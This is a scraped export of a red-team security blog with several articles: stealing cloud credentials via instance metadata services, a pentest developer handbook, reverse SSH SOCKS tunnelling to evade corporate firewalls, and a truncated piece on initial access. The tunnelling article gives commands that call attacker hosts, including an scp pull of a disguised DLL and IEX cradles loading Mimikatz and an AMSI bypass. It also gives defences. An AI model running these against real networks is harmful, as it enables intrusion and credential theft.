understand why the metadata service exists I am going to directly quote a great video on the topic from risk3sixty which I urge you to watch here.\n“It is an internal IP address that is attached to any given EC2 instance by default, that provides a set of information that can be used by application developers who need their application to automatically perform some tasks” - Risk3Sixty\nHere, AWS-specific terminology can be interchangeably used with Azure or GCP terminology, as the same features exist for the same reasons across them all. They even all use the same IP address for this http://169.254.169.254, meaning you do not need to know the specific implementations. As risk3sixty put it, the ‘set of information’ which can be requested here is vast, but can include some very useful information to an attacker. Top of mind is the web application’s session token that it uses to authenticate to the cloud environment and perform actions. In order to access this service, we simply need the ability to issue requests as the web application to this specific endpoint. Once we know which endpoint houses the data that is of interest to us we can generate a request and receive back our information. Specifically, we need to coerce the application into sending a HTTP request to the specific metadata endpoint, and read the result. It should go without saying, therefore, that gaining remote code execution on the web server will in almost all cases be sufficient to retrieve that data. However, this could also be leveraged by less ‘impactful’ (in the traditional sense) vulnerabilities such as SSRF. As you might imagine, this could breathe entirely new life into the potential impact of SSRF vulnerabilities.\nCloud vendors realised that these vulnerabilities could potentially open doors to new attack vectors, and so introduced additional controls to protect against them. In all modern metadata services you are required to send additional HTTP headers with specific values, meaning that you are more likely back in the realm of remote code execution. However, in older versions you may find that this is not required, meaning that SSRF could still be sufficient.\nWith the theory out of the way let’s look at some practical examples in Azure and AWS. Here are the steps I would take if I landed on an cloud-hosted web servers.\nAWS Firstly, check the version of the metadata service in use. As mentioned, older versions (IMDSv1) do not require additional headers, modern versions (IMDSv2) do.\nimage2 Figure 1: 401 response (missing headers) from main metadata endpoint, meaning IMDSv2 is in use As we are working with IMDSv2 we will need to create a bash script or similar which will request the necessary headers, and then include them in subsequent requests which ask for metadata. The script below can be found here.\nimage1 Figure 2: Bash script for gaining access to IMDSv2 Towards the end we can see it requests the ‘credentials’ (think access keys) of the EC2 instance.\nimage4 Figure 3: EC2 Security Credentials requested We can then run the script and receive back a plethora of useful information, including the keys and tokens the VM uses. image5 Figure 4: Metadata of EC2 instance collected, with EC2 Security Credentials at the bottom. Azure In Azure, this looks similar. Firstly, we generate a generic request asking for information about the VM with the ‘Metadata:true’ HTTP header. image3 Figure 5: Metadata being returned from Azure Metadata Service endpoint As the metadata service is returning information correctly we can request our session token of the managed identity assigned to the VM.\nimage7 Figure 6: Session token returned for the VM If you are working with an app ‘service’ as opposed to a VM the process is slightly different but still very much possible. In this case you should follow this.\nNow, we have these session tokens, so what? You may be thinking that we already had remote code execution on the virtual machine to get to this point so why do we care about the session token? Whilst you may try many of the same attack paths that you could with an on-premise application through this RCE, you now also have another angle of attack. With these session tokens you are able to ‘login’ to the cloud environment (usually without MFA as these are intended to be used by your non-human service accounts). From here, your attack vectors are far more extensive than in most traditional setups. image9 Figure 7: Authenticating to the cloud environment as the compromised Azure VM. For example, having authenticated to the cloud environment you now have an incredibly rich API at your disposal to begin looking for further vulnerabilities. This could include simply running ‘Get-AzResource’ within Azure, which will reveal all resources that you (as the application) have access to. In the screenshot below we can see that in this case this was access to a KeyVault with app secrets within! image6 Figure 8: The compromised application has access to a KeyVault Thanks for making that so nice and easy. No searching through config files to find SQL databases and connection strings, then manually crafting individual SQL queries to begin exploitation. Here, we have simply run a single API command and then can run a second to dump all the information that we have. This is just one example of several thousand that you have available to you once you authenticate with common cloud API tooling.\nBut wait there’s more…now that we have the session token for the application we can begin using any number of enumeration, post-exploitation or privilege escalation tools that we want from the perspective of the application. No need to install tooling on the device and trip off those pesky EDR’s, we can simply fire up our preferred tooling (think Azurehound, GraphRunner, bf-aws-permissions, etc.) and load in your session token. Of course, this introduces different OPSEC concerns, but bypassing those detections is something we will discuss later this year (hopefully at a conf!).\nCloud Permissions Now let’s rub salt in the wound. We’ve used our compromise to hit the metadata service and load up our favourite tooling with a session token. Access should be strictly limited, like it was on-premise right? Whilst this is true in theory, understanding and implementing fine-grained access controls and restrictions is a tall order in the modern world of highly complex cloud environments. I would like to call out here how many hundreds of IAM roles there are in most cloud environments, many of them with similar yet opposing permissions. Take a look at just the built-in Azure roles (not to mention any custom ones implemented to fill gaps) which already totals more than 130 options. You can see how reading each of these and understanding the nuanced permissions they have can be taxing, and goes some way to explaining why we so regularly see overly permissive accounts. We often see permissions being used without the full knowledge of what subsets of those permissions can introduce. To provide a very oversimplified example, we regularly see Global Administrator accounts being very well restricted and kept under lock and key. However, some lesser known roles like ‘Privileged Role Administrator’ and ‘Privileged Authentication Administrator’ both allow a threat actor to escalate privileges to Global Administrator through resetting passwords or assigning roles to attacker-controlled accounts. These permissions may have been assigned more liberally, and compromise of them may not trip off as many alerts. Ultimately, what I am trying to get at here is that when you combine the complexities of modern cloud environments (which we believe to be largely less well understood than on-prem) with the ability to run a plethora of tooling to identify any misconfigurations or overly permissive accounts (including the application you have compromised!) you often introduce far greater security concerns than you might traditionally do on-premise. Don’t believe me? Read this great deep dive into the Microsoft breach which took place at the start of 2024 in which Microsoft themselves had inadvertently given a legacy app service permissions akin to Global Administrator…\nThe above also introduces an entirely new attack vector within Azure, of applications (service principals) that you compromise potentially having elevated permissions in other cloud environments beyond just the tenant you are in…but that is a topic for another day.\nServerless Functions A final point is that with the rise of serverless architecture (AWS Lambda, Azure Functions, etc.) we are starting to get our hands on these more often. Crucially, these can still be thought of as cloud-hosted web applications, and may be vulnerable to the same risks mentioned above depending on the implementation. For example, a member of our red team recently found a way to package and exfiltrate data over DNS from an AWS Lambda that had DENY ALL on all TCP and UDP ports to all ranges. For a write up on that check out this recent labs article. The key point here is that whilst they might not look and feel like traditional web apps, these serverless functions present the same risk to an organisation as a web app and can be used to progress attack paths just as well. Conclusion In conclusion, I am not suggesting that up until this point AppSec has not been of paramount importance. However, when looking at the arguments presented and the work we’ve been conducting as a team over the last year I feel that the migration to cloud might present yet another watershed moment in AppSec’s journey. Perhaps it will take a notable organisation to be breached via a cloud-hosted application entry point for this point to become salient, but in my eyes it is a matter of when, not if. Thanks for reading and I hope my internal monologue on the topic was of interest!","disclaimer#\u003cstrong\u003eDisclaimer\u003c/strong\u003e":"","introduction#\u003cstrong\u003eIntroduction\u003c/strong\u003e":"","serverless-functions#\u003cstrong\u003eServerless Functions\u003c/strong\u003e":"","the-traditional-approach#\u003cstrong\u003eThe Traditional Approach\u003c/strong\u003e":""},"title":"How Cloud Migration is Affecting AppSec - A Red Teamer's Perspective"},"/articles/2024/08/2024-08-06-how-to-handle-development-projects-in-a-pentest-company/":{"data":{"bonus-section#Bonus Section":"","final-words#Final Words":"A developer handbook is a constantly evolving document. The main purpose is to give guidance and contribute to the quality of development related work within a company. It should be adjusted every now and then, and it should never be considered a “finished product”. You will need to put the effort in yourself to create something that works for you and your team. This depends completely on the expertise of your team and what is important to your projects. There should be discussions with the team and every team member should be able to make changes to the document (remember section 99).","format--location#Format \u0026amp; Location":"","github-automation#Github automation":"To give you a bit of technology in this blog post I figured it is best to quickly go over Github actions so that you can automatically generate the latest PDF version of the markdown files which you can then share with your team or store them somewhere for your ISO audit. We are using [pandoc](https://pandoc.org/) to automatically merge the different sections to a PDF. However, we cannot directly make it a PDF, we first must make a final HTML version. You can go over each step by reviewing the file: https://github.com/JumpsecLabs/Developer.Handbook/blob/main/.github/workflows/build-pdf.yml\nThere are two jobs involved: Building the final PDF version Releasing it under the release tab on Github Building a PDF We cannot directly go from markdown to PDF with pandoc. Hence we must create an HTML version first. pandoc -t html --include-before-body=./version.md -s -o developer_handbook.html --toc --number-sections --wrap=none $(cat pandoc_order.txt) This command takes all the files and in the same order as specified in the pandoc_order.txt file and converts them into a single standalone html file. Mind you, for the HTML version, we also have a css.md file, that allows us to make some nice colouring changes. Once we have the HTML version we run the converter to PDF\npandoc developer_handbook.html -s --pdf-engine=pdflatex -o developer_handbook.pdf -t pdf -f html Have a look at the step “Install pandoc” in case you have issues here.\n- name: Install pandoc run: | sudo apt-get install texlive-latex-base texlive-latex-extra texlive-fonts-recommended pandoc -y We are running this workflow on a base Ubuntu image and therefore need to install the latex package required for the pdf-engine. There are other engines as well, but we had some issues that pandoc did not find. In addition to the base installation some extras are necessary and for good measure we also put the fonts package in there. There is an texlive-fonts-extra package for fonts, however that increases the running time for the installing step immensely. There is an alternative way of doing this, and it is also documented on the official pandoc website: https://pandoc.org/installing.html#github-actions Releasing the PDF We keep the approach very simple. We have a version.md file which we can update at our own will and bump the version manually. If you look closely at the “Extract Version” step in the release job you can see we extract it and later use it to tag our release upload on Github.\n- name: Extract version id: extract_version run: | version=$(grep -oP 'Version: \\K[0-9]+\\.[0-9]+\\.[0-9]+' docs/version.md) echo \"::set-output name=version::$version\" ","give-me-a-real-example#Give me a real example":"Now that you have an idea of what sections there should be in a handbook, have a look at ours:\nhttps://github.com/JumpsecLabs/Developer.Handbook","section-1---introduction#Section 1 - Introduction":"","section-10---documentation#Section 10 - Documentation":"We are entering the inception phase with this one. Writing documentation and guidelines on how to document projects. However, it is a very important subject, as documentation often gets outdated very quickly. There are some solutions, such as self explaining code, building documentation automatically based on docstrings, comments etc. Rather than writing a handbook for each project, the time should be spent on the quality of the project. There might be a specific process that is involved to create documentation files automatically within the CI/CD as new versions are published. ","section-11---security#Section 11 - Security":"Every programming language has some pitfalls. Specifically junior developers might fall for them. An obvious one might be the concatenation of strings rather than using f-strings. There are however many more and often some sort of approach or “library” should be established by developers within your company. Often code is reused, copy \u0026 pasted into new projects and simply adjusted. How do we check for security issues? What static code analysers should be used? Are there any requirements in the configuration of these?","section-12---performance#Section 12 - Performance":"The performance section is quite an interesting one. Here, it is really up to you how deep you want to go  and how important performance considerations are. They certainly do matter, however, given that as a pentesting company your tools/products don’t serve 100 million end users it makes sense to show some approaches that might be better than introducing more advanced concepts such as multithreaded, multi core, async operations. Of course there are exceptions for certain tools. I suggest not to limit the section to pure technology based performance patterns, but also talk about general performance improvements within coding projects, such as best practices for code maintainability, documentation, dependencies, refactoring and so on.","section-13---accessibility#Section 13 - Accessibility":"We kept this section very short. We do not support any accessibility. All tools must be in English, no translations needed. Nor special support for operation systems, screen readers etc. Our tools are not for “real end users”, they are for the tech community and our team. However, if you do publish something that goes out to clients or end users, it might make sense to think about this section in more depth. ","section-2--code-of-conduct#Section 2- Code of Conduct":"","section-3---defining-programming-languages#Section 3 - Defining Programming Languages":"","section-4---code-styles#Section 4 - Code Styles":"","section-5---editors#Section 5 - Editors":"","section-6---version-control#Section 6 - Version Control":"","section-7---project-setup#Section 7 - Project Setup":"","section-8---testing#Section 8 - Testing":"","section-9---ci--cd#Section 9 - CI \u0026amp; CD":" stallions If you are a pentester you probably never really think about programming. Instead you are testing what others have developed. However, every now and then a quick python or bash script is needed to exploit some stuff you have found, or automate a certain process you are using. Things become interesting when you are in a penetration testing company that has many strong penetration testers and everyone writes these scripts. Clearly each script solves a particular problem, either for the tester or the team. So how do we ensure, that:\nNo time is wasted on writing the same scripts others have already written We keep the knowledge available when team members leave the business Ensure that any code is understandable for everyone Ensure that the knowledge in regards to the script is preserved for others to use. The more scripts that are written, the more knowledge goes into code. Code needs maintenance. Suddenly we find ourselves in the same situation as any other software development company. With a difference though, the life expectancy for a script is often just for a single project that lasts up to one month. Meaning, the code goes into hibernation, people forget about it or someone might remember it eight months later on another project. What you might end up with is an unmaintained self hosted gitlab instance with 200 projects, that no one knows anything about. What makes it even more chaotic is the usage of different languages that testers are comfortable with. Some might have a stronger background in Ruby, some really like using Golang. Others might write Typescript instead of Javascript. Don’t forget about Rust, all the C languages and maybe even some good old PHP. I want to share my knowledge about these issues and how we tackle them at JUMPSEC. We are fortunate enough to have a dedicated development team given we work on larger projects, such as our proprietary solution that is the backbone to our Continuous Attack Surface Management service. Understanding the basicsBefore we tackle anything, we must understand the root cause for any problem. You might want to skip this section and jump straight into the solution areas below as this is non technical and very dry. At the very top, we should understand how important development is and understand the differences and challenges a penetration testing company has. In general, a developer gets paid to work on a product that solves a problem for a customer. They do not get paid to write code, as plenty of juniors might think. A penetration tester is getting paid to write a report that outlines the security issues a client has. In the background a developer must write code to make their product usable, while a security expert chooses to make use of programming to help with a certain problem (but might never need to). If we look at this from a very high level, it should be clear that a developer has much more experience handling code, compared to a general security researcher, simply due to the time they spend on programming. There are of course exceptions, where you have a team member that moved from development to cyber security in their professional career. But remember, you are only as strong as the weakest link. Which brings us directly to the people problem. It is already difficult to find new employees for a penetration testing company. The pool of experts is small and there is a worldwide shortage. Why would one make the pool even smaller, by requiring from a potential candidate that they know 10 different programming languages that might be used within the business? This brings us to some very important and specific requirements for our solution: We must define what programming languages are used amongst the team Our solution cannot prohibit us from reducing the number of candidates Lets focus on the level of expertise and what we do with the weakest link and the most experienced developer on our pentest team. Generally, from my experience, penetration testers are not shy to play around with technology and are not afraid to break things. It is kinda part of the job description. So setting up a new environment for a project, like a C2 infrastructure is not really scarce. However, the approach between a developer, possibly with fullstack and devops experience, will differ from that of a security researcher. I believe in the year 2024 it is basic knowledge to set up stuff with docker and docker compose. However, I also think that it is not common to know your way around k8s, minicube and helm. Let alone I would never expect a pentester to be able to setup a full infrastructure as code project with Terraform, Ansible and Azure. Most certainly, not in an ad hoc situation for an adversarial simulation or similar pentest project. What if some members of the team are able to do that though? Well, the moment you start deploying projects in a very professional manner with lots of experience behind it, it becomes only manageable by the people that have that experience and exposure to the project. In other words, if your person leaves the business you start to have an unknown skeleton on your infrastructure, in some cases people might not even be able to login because of missing SSH keys. This brings us to the requirements:\nTechnology used must be easy to learn and should not require lots of specialised expertise Must have the resources to onboard new team members quickly The goal must be that everyone in the business is able to jump on the maintenance call and get stuff solved Do not become dependent on a single person in the business The solutionAs we know from security and specifically ISO 27001 certifications, it’s all fine and great to have documents everywhere, but unless it really becomes the culture of the business, documents are useless. Unfortunately, we won’t be able to make it a culture without a document that clearly defines some processes and gives guidance to new members quickly. Quite frankly, a very well written document can speed up many different areas. Let’s call this document The Developer Handbook. If you have a look around the internet you will find many guides on how to write one. I would like to share with you our, real \u0026 currently in use, developer handbook. Furthermore, I will go into some details of some sections going forward. Let’s look into the sections that I believe are required for a successful document.\nFormat \u0026 Location Documentation for development projects quickly gets outdated, let’s start by hosting it on Github and writing it in markdown, so any IDE / text editor can handle it. Versioning is also taken care of by working with git. After all, everyone that does coding should be familiar with some version control system. We will use pandoc to convert the markdown to a PDF version, and in fact an HTML version as well. Section 1 - Introduction This section should cover the purpose of the document. Making it clear why people should read it and what the overall expectations are (both for the document and the users).\nSection 2- Code of Conduct As we are often building tools that make you think “what if this gets into the wrong hands”, we should remind ourselves why we do it. At the end of the day we are professional researchers that focus on security related subjects. The tools we write are there to make software behave in unintended ways, exploit vulnerabilities or make our life easier. Section 3 - Defining Programming Languages In this section we should emphasise on our ability and set some limits. Sure it’s fun to explore new programming languages as a technical person. Frink, Rebol and Forth languages might look interesting during a weekend, but how many other people in the team could help out with those code bases? How quickly can issues be resolved by falling back to Stackoverflow and Google? Just because AI can help you with it, doesn’t mean it makes sense to use it in a business context. Keep those things to personal projects and find a common language everyone feels comfortable with. Usually that is: bash scripting, Python, sometimes Golang and lately more and more people are getting into Rust. Section 4 - Code Styles This one is probably the most overlooked subject of all. However, it is incredibly useful \u0026 helpful to define a coding style for the entire team. It helps a lot, when everyone follows the same code style and no one needs to “adjust their way of reading”. Section 5 - Editors Isn’t everyone on Sublime these days? Ah no, Atom looked so much nicer. What about Netbeans, PHPStorm, Eclipse (eh), vim, nano. Well, and then there is VSCode. At the end of the day it doesn’t really matter which editor you use to write code in. What is more important is the set of features it can provide you to save time by automating tasks, such as formatting code to your set coding style. We went with VSCode. It is available in various “editions”, what matters for us is the extension ecosystem. We make heavy use of mypy, formatting and automated docstrings. solved within the editor and not just via pre-commit.\nIf you are using VSCode, this would also be a good place to have specific configurations shared, including default configurations for developer containers.\nSection 6 - Version Control First of all you want to specify what version control system you want to use. Whether it is git or svn. However, it is more important that this section can help as a “tutorial” on some processes. Sure you would expect everyone to know “git clone”, “git pull”, “git add” and “git commit”. But how about merging? Is this something you expect every consultant to know? What about the language of git? Staging \u0026 Stashing are probably the easiest ones. However, never assume that everyone is on the same page as you are. Specifically with development, things can go wrong or be done in many different ways. How do we delete files from the git history again so we don’t expose some secrets? Should we squash and if so when? How to do things and when to do them, without going over the entire git manual is probably a good starting point for this section.\nSection 7 - Project Setup The project setup section should cover a few things such as how a project should be structured both in terms of files, how dependencies are managed, what type of files are required. Best practices for public Github repositories, and generally how a project should be managed. Given that we are in a git environment, why not create an example project folder as well? Section 8 - Testing There are many types of tests that can be written for any software project. Most likely performance tests are not the most important ones for pentesting software. However, this section should give some guidelines on what is expected and what testing suite should be used. It can also explain how to set up testing in a new project. How to use setUp and tearDown methods. Section 9 - CI \u0026 CD Not every project needs a CI/CD process, however, whenever there is one it is imperative that certain actions are being executed. The section should talk about some limits in terms of resources to the company (not everyone has Github Enterprise with thousands of hours of worker times). Which workers should be used, what the authentication process looks like and how images need to be tagged.","section-99---learning-resources#Section 99 - Learning Resources":"This is probably the most important section for new team members, junior team members and anyone that is starting on a project. The handbook should provide some valuable links and collections to tutorials and courses that the team can use to understand certain subjects. There is no harm to also link to your own blog posts.","the-solution#The solution":"","understanding-the-basics#Understanding the basics":"","useful-vscode-extensions#Useful VSCode extensions":"There are only two VSCode extensions I would recommend for this specific project type. Markdown All in One This one should be a no-brainer to everyone. However, did you know it can generate a table of contents for you? Open the command palette and run the command “Create Table of Contents”. Markdown as PDF This one is a nice one if you want to create a quick PDF out of an MD file."},"title":"How to Handle Development Projects in a Pentest Company"},"/articles/2024/08/2024-08-13-ssh-tunnelling-to-punch-through-corporate-firewalls-updated-take-on-one-of-the-oldest-lolbins/":{"data":{"":" ezgif 7 4b7e7cf968 In my formative days of learning network hacking, SSH tunnelling was amongst the first tunnelling techniques that I learnt. I still remember trying to repeatedly decode my notes and diagrams on the rather cumbersome syntax of single port forwarding with the -L and -R flags, which at the time was taught as “the way to do it”. If your foothold is (luckily) a Linux server, then you’re blessed with the -D flag to spin up a SOCKS proxy on the foothold itself to access the network via proxychains.\nFast forward a few years later, in our day-to-day work, be it network pentest or adversary simulation, I’ve found my colleagues and I using good ol’ SSH tunnelling in real engagements not less, but more.\nQuoting what Andy Gill @ZephrFish said in SteelCon 2024 a couple of weeks ago:\n“F*** C2 frameworks, a tunnel is all you need.”\nWhile I might not feel this as strongly as Andy does, there is more than a pinch of truth in that statement. A good tunnel can often be everything you wanted to execute from the end user laptop. And yet, a Google search “SSH tunnelling in pentesting” and “…in red team engagements”, would see most top results still described the “old” way of punching single port-sized holes with -R and -L, or local dynamic SOCKS with -D, which is actually not at all how we used SSH in our engagements. There are a couple of recent blog posts (linked below) published within the recent 1-2 years describing SSH tunnelling using the Reverse dynamic proxy and their unique spins on it, so I’ll avoid as much overlap content as I can and present our tips and tricks about SSH tunnelling, with a focus on getting through firewalls.\nSSH tunnelling is of course not our primary nor sole way to tunnel out of a client’s network (wink wink), but whenever I am in a pinch, and nothing else works, this little tool has served me oh-so-well.\nShoutout to recent blog posts describing similar flavors of the SSH tunnelling technique:\nLiving off the land with native SSH and split tunnelling - by PTP’s Joe Blogs in Mar 2024, a concise summary of the fundamental form of this technique SSHishing – Abusing Shortcut Files and the Windows SSH Client for Initial Access - by Red Siege’s Alex Reid in Apr 2024 going over the interesting take on using Lnk files to turn the SSH tunnelling command into a phishing payload The SOCKS we have at Home - by TRUSTEDSEC’s Esteban Rodriguez in Oct 2023 detailing creation of a limtedaccess user on the remote server for better Opsec ","3-tricks-to-punch-through-corporate-firewalls#3 Tricks to punch through Corporate firewalls":"1. Basic form: -R On the compromised Windows or Nix machine, run SSH with either the binary’s name:\nssh -R PROXY_PORT user@attacker_server.com Or use the full path, on for example port 8888\nC:\\Windows\\System32\\OpenSSH\\ssh.exe -R 8888 user@attacker_server.com On assumed breach gigs we have a quick trick to check whether outbound SSH is allowed which I will elaborate in the next section.\nscreenshot1 Here we assume you have a VPS with a static IP / DNS record pointing to the VPS, on the internet. If you so choose to use password authentication, do set up IP allowlisting on your client’s and your own egress IP only to avoid being brute-forced. Then on your VPS / attacking server, set up /etc/proxychains.conf as usual. Specifying the remote server’s proxychains.conf to use SOCKS5 would enable the additional compatibility of UDP and thus DNS lookups through the tunnel as well:\nsocks5 127.0.0.1 8888 Then you could run your commands on the attacking box with proxychains:\nproxychains nmap -sT -F internal_target_ip proxychains nxc smb internal_target_ip -u USER -p PASSWD --shares proxychains secretsdump.py ... and so on On Red Siege’s SSHishing blog post the author described not requiring a password OR key to login plus the -o “StrictHostKeyChecking=no” flag to disable the “Are you sure you want to continue connecting (Yes/No/Fingerprint)” message so that the command could be inside of an Lnk file or a Malicious Office macro, but I still have reservations regarding not requiring authentication to access your C2 server (even if it’s a limitaccess user with /bin/false as default shell).\n2. Azure domain / ASN to get pass firewall Azure Domains A good indication of the client’s firewall having absolutely no blocks on SSH is when an SSH host that they almost certainly have no use for is allowed, such as:\nssh root@scanme.nmap.org # if you get a prompt, you've struck gold! # pls don't do anything abusive or malicious to scanme.nmap.org! Of course, it is not always so easy that it works right away, and whilst not in assumed breach you wouldn’t have the luxury of a PowerShell session to check the client’s firewall. So, what if Scanme is not reachable? The first thing I would try is to use a VPS on Azure. The underlying reason is that Windows environments are highly likely to be on Active Directory and most likely Hybrid. There is a high likelihood that the client’s stack requires either Microsoft own IPs to be allowlisted, or Azure subdomains to be blanket trusted.\nWhat I’d do is to spin up a VM from Azure and then give it an azure subdomain from the Public IP address settings: Public IP \u003e Settings \u003e Configuration \u003e DNS name label (optional) -\u003e Enter your desired subdomain name.\nscreenshot2 ssh.exe -R 8888 user@innocent-looking-front.REGION.cloudapp.azure.com Something mundane such as msservicesupdate.uksouth.cloudapp.azure.com should be fine. This has been proven to work in many of our engagements.\nASN to the rescue Domains tend to have higher success rates on phish emails or C2 callbacks because corporate firewalls tend to block requests to raw non-internal IPs. However, Azure domain fronting (some practitioners use Azure CDN fronting) is actually known to Microsoft themselves too. Perhaps the blue team / Sysadmin in the client knew this and blocked outbound access to *.region.cloudapp.azure.com for example because they know about this technique and give their own DNS hostnames to their Azure VMs?\nIn this case even if the subdomain is blocked, you could / should try the raw IP anyway because it is on Microsoft owned ASN. I have had it happen that using the raw IP worked, so it is definitely worth a try when you’re desperate. The IP address would be in Microsoft’s ASN and there could be an allowlist somewhere that green lights the range.\nssh.exe -R 8888 limiteduser@1.2.3.4(azure_vm_ip) 3. Alternative Egress Port Sometimes outbound port 22 to the internet is (fortunately or unfortunately) blocked on the client’s endpoint. However there’s also a catch that not all corporate firewalls inspect the underlying protocol / do SSL stripping and deep packet inspection (so-called Application Layer Firewalls). It is definitely worth a try to set the ssh port to non-22 on your VPS and restart SSHD. Port 80, 443, 53 tend to be good candidates for this to work. I’ve sometimes even seen Windows / AD ports outbound to be allowed, stuff I wouldn’t expect like NETBIOS(139), KERBEROS(88) , SMB(445), LDAP(389) but sometimes it is needed for certain Azure / Entra interaction. Of course classic service ports like SMTP(25), FTP(21) and so on are also within reason to try, but personally I’ve had less luck with those.\n# edit /etc/ssh/sshd_config with your favorite text editor Port # save and close # don't forget to allow inbound on this port from your IP on your cloud provider), then: sudo systemctl restart sshd ","bonus-what-else-could-you-do-with-this#(Bonus) What else could you do with this?":"There are a couple of use cases other than just running offensive tooling through an available outbound SSH connection:\nGetting payloads in and data out: If you can get SSH out, then either getting payload in or exfiltrate data out via SCP shouldn’t be a problem:\nscp.exe user@unsuspecting.uksouth.cloudapp.azure.com:/home/user/totally_okay_payload.dll C:\\Public\\AppData\\version.dll (More) OpSec safe In memory powershell script execution with IEX: If you have a good Amsi bypass, ssh is a good way to grab it along with other powershell scripts, especially with how scrutinised Invoke-WebRequest is. The common way observed in the wild to invoke scripts is:\nIEX (New-Object System.Net.WebClient).DownloadString('http://192.X.X.X/invoke-mimikatz.ps1') In a constrained PS environment the (New-Object) cmdlet would not even work, and secondly this command has been signatured to death so it’s probably not a smart thing to do in a covert job. However, you can run one command upon ssh-ing into a host in the format of:\nssh user@server \"command arg arg2 ...\" Essentially you can use this to cradle your AMSI bypass with a malicious script like so (this again can also be bundled into the Lnk file or a malicious macro):\nIEX (ssh user@server \"/usr/bin/cat /home/user/amsibypass.ps1\"); IEX (ssh user@server \"/usr/bin/cat /home/user/invoke-mimikatz.ps1\") ","how-to-secure-this#How to secure this?":" Removing the SSH client: It is recommended to remove the builtin SSH client for non-technical staff. It can be done by first removing the SSH client with Settings’ \u003e ‘Apps’ \u003e ‘Optional Features’ \u003e Search for “OpenSSH” and hit Uninstall then reboot. It however is still in System32. Uninstalling the SSH client from the endpoint is not yet complete after this, as described in the PTP blog post. To further remove the binaries:\ntakeown /F C:\\Windows\\System32\\OpenSSH /R /D Y icacls C:\\Windows\\System32\\OpenSSH /grant administrators:F /T rmdir /s C:\\Windows\\System32\\OpenSSH Secure the corporate firewall settings: Even if the SSH client is no longer present in the endpoint, the attacker could still move a LOLBin version (signed by Microsoft) onto the user endpoint, or operate from an internal Linux /Mac machine for example. The first order of business is of course blocking outbound TCP connections on port 22 if it is not needed. I’m no firewall expert but for firewalls that support application level operations, SSL stripping with protocol inspection should be performed on ports not meant for SSH (443 and so on) and block connections where the protocols are not matched. There are probably no good recommendations from me for clients who need to allowlist Microsoft ASN IP or Azure subdomains for SSH access unfortunately. If the reader has good ideas on this by all means let me know!\nMonitor for the user endpoints for the SSH binary being called: For non-technical staff, the SSH \u0026 SCP binaries have little reason to be called at all. A custom alert could be written fire off when SSH.exe or SCP.exe is called (optionally, with filehash matching as well).\nIn summary, SSH.exe has been bundled with Windows 10, 11 \u0026 Windows Server since late 2017 and signed by Microsoft. The reverse dynamic proxy is very powerful and there are a number of tricks that can be used to punch through corporate firewalls to get a reliable tunnel for offensive tooling to compromise entire AD domains. Defenders are recommended to watch for invocation of this binary on endpoints used by non-technical users, or uninstall the feature entirely.","lets-cut-to-the-chase#Let’s cut to the chase":"The OpenSSH client is natively available in almost all Windows machines with an OS / Service Pack later than early 2018, more specifically Win10 v1709 and Win Server v1803. (To the Windows sysadmin reading this, you don’t have to use Putty anymore!)\nFurthermore, the stars were so aligned in 2017 that, right before Microsoft ported OpenSSH to Windows, the OpenSSH project implemented the reverse dynamic proxy feature, a bit obscurely (if you ask me!) reusing the -R flag in version 7.6. (This has been explained in the ChangeLog for 7 years but yet not many people are talking about this, which shows that RTFM does, in fact, often pay off.)\nIn 2024, corporate laptops or workstations are almost universally on either Windows 10 or 11, and that means the ssh command is, on most pentesting or adversarial gigs, sitting in the PATH of the client’s machine without needing us to install or enable anything extra.\nTo make this as unambiguous as I can - the native ssh command on Windows 10/11 devices has been allowing anyone to start a reverse \u0026 dynamic SOCKS proxy into any internal network since 2017! And that makes it possible to run tools like Impacket scripts, Netexec (formerly Crackmapexec) or Certipy natively behind the SOCKS proxy on a remote Linux server, while to the defender the traffic appears to originate from the compromised machine.\nAnd in 2024, many corporate firewalls still allow SSH outbound from workstations, or are configured in such a way that it is relatively trivial to bypass, and blue teams are often not watching ssh being executed because of how much of a LOLBIN it is."},"title":"SSH Tunnelling to Punch Through Corporate Firewalls - Updated take on one of the oldest LOLBINs"},"/articles/2024/08/2024-08-20-adversary-at-the-door-initial-access-and-whats-currently-on-the-menu/":{"data":{"#":" wolf in sheep clothes 1 Based on the data from the Cyber Security Breaches Survey 2024, phishing with malicious links or malware remains the most common initial access vector, followed by impersonation. The challenge with impersonation attacks is that current technology often struggles to accurately determine the purpose of a website. Although checks on domain maturity, reputation, categorization, and certificates are performed, a skilled adversary can still create sophisticated phishing infrastructure that hosts malware. This allows them to establish a foothold within a network and gain initial access, despite various defences.\nInitial access is a set of techniques that exploit different entry points to gain an initial foothold in an organisation’s network. There are several initial access techniques that can include various social engineering methodologies and exploitation methods, for example misconfigured web servers i.e. instance of Apache Tomcat or exposed management services, i.e. Remote Desktop Protocol on port 3389. It can also include a trusted third party compromise where direct access is gained from captured credentials or a device.\nimage8 Figure 1: Visual representation of cyber kill chain.\nThe initial exploitation can be long-term or limited based on the method of entry and reason for exploitation. Once the adversary gets a foothold within the network, the attack execution is carried out, where the adversary tries to run malicious code, explore the network, or steal confidential data. This in itself has also become a lucrative business, as IAB’s (Initial Access Brokers) have specialised in doing just that, gaining the access to the networks and then selling it to other threat actors as it becomes significantly harder from year to year.\nFortunately, there are safeguards in place that protect organisations and users from adversaries, making initial access significantly more challenging when a defense-in-depth strategy is properly implemented. This is a stark contrast to the threat landscape of 10-15 years ago. Also on the other side, we frequently hear major news about vulnerabilities, bypasses, and exploitation of these control technologies that are our very . For example, just last week, a Windows SmartScreen vulnerability was discovered and exploited to deploy malware in the wild, as reported in this article.\nWhat prevents Initial Access?As previously mentioned, adversaries now face significant challenges in gaining initial access to systems and networks. These challenges arise from a multi-layered cybersecurity approach that employs advanced technologies and best practices. Given that most of our clients at JUMPSEC rely on Windows and Active Directory, I’ll highlight technology examples specific to that environment.\nHere are some key technologies that effectively thwart less sophisticated initial access attempts:\nWindows SmartScreen image7 Figure 2: Upon execution of an unknown binary, SmartScreen popup will appear.\nWindows SmartScreen was originally launched with Windows 8, which was released on October 26, 2012, and is intended to protect users from numerous online risks and has been proven to be effective against less sophisticated adversaries. It works by checking the following upon execution:\nIs the signature of that binary a known malware Is the binary signed Is the certificate signing authority known and trusted by Microsoft SmartScreen will display a warning before allowing it to run and potentially detect and prevent malware being run on the system.\nAdversaries employ various methods to bypass these measures. One such tactic involves exploiting Windows’ inherent trust in binaries - wink wink DLL Side Loading, but delving into this topic merits another blog post. In contrast to SmartScreen, which primarily assesses the reputation of the entry point program, Windows 11’s Smart App Control takes a more comprehensive approach. It verifies the integrity and digital signatures of all code (including DLLs, scripts, etc.) loaded by the Windows OS Loader and script engines to enhance security measures.\nSignature verification Microsoft’s Authenticode technology allows software publishers to use X.509 code-signing certificates to sign their software. These certificates verify the identity of the software publisher to ensure that the software 